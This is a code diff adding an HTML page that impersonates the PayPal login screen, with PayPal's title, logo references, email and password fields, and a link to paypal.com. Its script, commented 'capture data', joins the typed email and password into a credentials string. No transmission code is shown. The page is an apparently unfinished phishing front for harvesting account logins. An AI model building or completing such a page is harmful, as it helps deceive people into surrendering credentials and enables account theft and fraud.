@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<head>
+<link rel="shortcut icon" href="img/pp.ico"/>
+<title>Log in to your PayPal account</title>
+<div id="form" class="form">
+	<img src="img/logo.svg" style="padding-left: 12.5%;">
+	<div id="passwordSection" class="clearfix">
+		<div class="textInput" id="login_emaildiv">
+			<div class="fieldWrapper" style="padding-bottom: 10px; padding-top: 20px;">
+				<input id="email" name="login_email" type="email" class="input-style" required="required" aria-required="true" autocomplete="off" placeholder="Email">
+			</div>
+		</div>
+		<div class="textInput lastInputField fieldempty hasError" id="login_passworddiv">
+			<div class="fieldWrapper">
+				<input id="password" name="login_password" type="password" class="input-style" required="required" aria-required="true" placeholder="Password">
+			</div>
+		</div>
+	</div>
+
+	<div class="actions actionsSpaced" style="margin-top: 30px;">
+		<button class="button actionContinue" type="submit" id="btnLogin" name="btnLogin" value="Login" onclick="login()" href="https://www.paypal.com/ca/webapps/mpp/home">Log In</button>
+	</div>
+
+<style>
+input {
+	#padding-top: 25px;
+	border-radius: 4px;
+   	border: 1px solid #9da3a6;
+   	padding: 20px; 
+   	width: 325px;
+   	height: 2px;
+	color: #9da3a6;
+	font-size: 15px;
+}
+
+#form{
+	padding-left: 30%;
+	padding-top: 10%;
+}
+
+#btnLogin {
+	border-radius: 4px;
+	background: #005ea6;
+	padding: 20px; 
+	width: 350px;
+	height: 3px;
+	text-align: center;
+	color: white;
+	//padding-top: 20px;
+ 	//padding-bottom: 20px;
+}
+
+</style>
+
+<script>
+function login() {
+	//capture data
+	var creds = document.getElementById("email").value + ":"
+	creds = creds + document.getElementById("password").value
+	//alert(creds)
+		
+}
+</script>
+</div>
+</head>
